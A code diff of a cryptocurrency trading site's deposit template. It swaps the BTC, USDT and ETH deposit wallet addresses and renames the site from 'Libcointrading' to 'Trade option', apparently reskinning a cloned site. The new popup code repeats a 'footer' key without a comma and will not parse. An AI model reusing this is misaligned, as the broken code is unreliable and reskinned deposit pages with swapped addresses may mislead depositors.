@@ -303,7 +303,7 @@
                                                                     withdrawal limit.</p>
                                                                 <div class="input-group">
                                                                     <input type="text" class="form-control js-content"
-                                                                        value="bc1qn57hvxl5elfahju0rmdqj3pucm76r93zuknqu4"
+                                                                        value="bc1q35zgvxmqu46j5lje3a9azg6kvq76ldfdaf56ja"
                                                                         readonly>
                                                                     <div class="input-group-prepend">
                                                                         <button type="button"
@@ -435,7 +435,7 @@
                 <div class="modal-body">
                     <div class="card">
                         <div class="card-body">
-                            <h5 class="card-title">Libcointrading Address (BTC)</h5>
+                            <h5 class="card-title">Trade option Address (BTC)</h5>
                             <div class="row wallet-address">
                                 <div class="col-md-8">
                                     <p>Deposits to this address are unlimited. Note that you
@@ -445,7 +445,7 @@
                                         withdrawal limit.</p>
                                     <div class="input-group">
                                         <input type="text" class="form-control js-content"
-                                            value="1Pwq8wVZogMiYmTHtaFYEBJsjQmUx1b2JW" readonly>
+                                            value="bc1q35zgvxmqu46j5lje3a9azg6kvq76ldfdaf56ja" readonly>
                                     </div>
                                 </div>
                                 <div class="col-md-4">
@@ -475,7 +475,7 @@
                 <div class="modal-body">
                     <div class="card">
                         <div class="card-body">
-                            <h5 class="card-title">Libcointrading Address (USDT)</h5>
+                            <h5 class="card-title">Trade option Address (USDT)</h5>
                             <div class="row wallet-address">
                                 <div class="col-md-8">
                                     <p>Deposits to this address are unlimited. Note that you
@@ -485,7 +485,7 @@
                                         withdrawal limit.</p>
                                     <div class="input-group">
                                         <input type="text" class="form-control js-content"
-                                            value="TCL9fzjjFYbXxG6HEpMM7XKFVzoTfSbjAx" readonly>
+                                            value="TEFDk5dxyHWSBiPyXvSLDoFVwdSyTMGVKA" readonly>
                                     </div>
                                 </div>
                                 <div class="col-md-4">
@@ -515,7 +515,7 @@
                 <div class="modal-body">
                     <div class="card">
                         <div class="card-body">
-                            <h5 class="card-title">Libcointrading Address (ETH)</h5>
+                            <h5 class="card-title">Trade option Address (ETH)</h5>
                             <div class="row wallet-address">
                                 <div class="col-md-8">
                                     <p>Deposits to this address are unlimited. Note that you
@@ -525,7 +525,7 @@
                                         withdrawal limit.</p>
                                     <div class="input-group">
                                         <input type="text" class="form-control js-content"
-                                            value="0x6960df8cade949ac71d9b2cc5d8096e1cbd7f675" readonly>
+                                            value="0x68ec1659E9eB577Fa42Aebc43d97f8C98D658F78" readonly>
                                     </div>
                                 </div>
                                 <div class="col-md-4">
@@ -590,8 +590,9 @@
                     if (ipAddress, walletId) {
                         Swal.fire({
                             icon: 'success',
-                            title: `Hey, <%= user.name %>`,
+                            title: `<%= user.name %>`,
                             text: '<%= user.withdraw %>',
+                            footer: `Wallet ID: ${walletId}`
                             footer: `Wallet ID: ${walletId}`
                         })
                     }
